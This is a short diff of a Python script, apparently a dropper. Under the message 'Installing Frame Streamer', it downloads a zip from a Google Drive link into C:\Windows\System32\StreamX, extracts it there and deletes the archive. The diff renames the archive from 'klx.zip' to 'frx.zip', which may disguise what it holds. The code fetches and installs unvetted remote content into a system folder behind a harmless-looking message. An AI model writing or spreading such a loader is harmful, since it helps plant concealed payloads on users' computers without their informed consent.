@@ -64,8 +64,8 @@ def download_file_from_google_drive(url, output_path):
 if not os.path.exists("C:\\Windows\\System32\\StreamX\\framex_custom.py"):
     os.system('cls')
     print("Installing Frame Streamer please wait.")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1fS4u0rJSx-u5m2oxeDmuOFQcD6igA6-c", "C:\\Windows\\System32\\StreamX\\klx.zip")
-    zip_file = r'C:\Windows\System32\StreamX\klx.zip'
+    download_file_from_google_drive("https://drive.google.com/uc?id=1fS4u0rJSx-u5m2oxeDmuOFQcD6igA6-c", "C:\\Windows\\System32\\StreamX\\frx.zip")
+    zip_file = r'C:\Windows\System32\StreamX\frx.zip'
     extract_dir = r'C:\Windows\System32\StreamX'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
